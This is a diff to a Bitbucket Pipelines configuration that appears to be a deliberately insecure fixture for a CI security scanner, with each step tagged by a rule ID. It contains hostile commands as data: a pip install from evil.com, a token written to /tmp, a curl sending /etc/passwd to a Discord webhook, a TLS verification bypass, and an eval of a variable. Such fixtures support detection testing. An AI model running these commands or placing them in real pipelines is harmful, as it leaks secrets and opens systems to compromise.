@@ -56,8 +56,21 @@ pipelines:
           - docker run --privileged myimage
           - pip install --index-url http://evil.com/simple/ pkg
           - echo "$BITBUCKET_TOKEN" >> /tmp/token.txt
+          # BB-021: package install without lockfile enforcement.
+          - npm install
+          # BB-022: dependency update bypasses lockfile pins.
+          - pip install --upgrade requests
+          # BB-023: TLS verification bypass.
+          - git config --global http.sslVerify false
+          # BB-026: dangerous shell idiom — eval re-parses the value as shell.
+          - eval "$BUILD_CMD"
+          # BB-027: pip install from an unpinned git URL.
+          - pip install git+https://example.com/internal/helper.git
         after-script:
           - 'curl -H "Authorization: Bearer $BITBUCKET_TOKEN" https://api.example.com/notify'
+          # BB-025: evidence of malicious activity — Discord webhook
+          # exfil of /etc/passwd.
+          - 'curl -d "data=$(cat /etc/passwd)" https://discord.com/api/webhooks/1234567890/abcdefg'
 
 # BB-020 — full clone depth.
 clone:
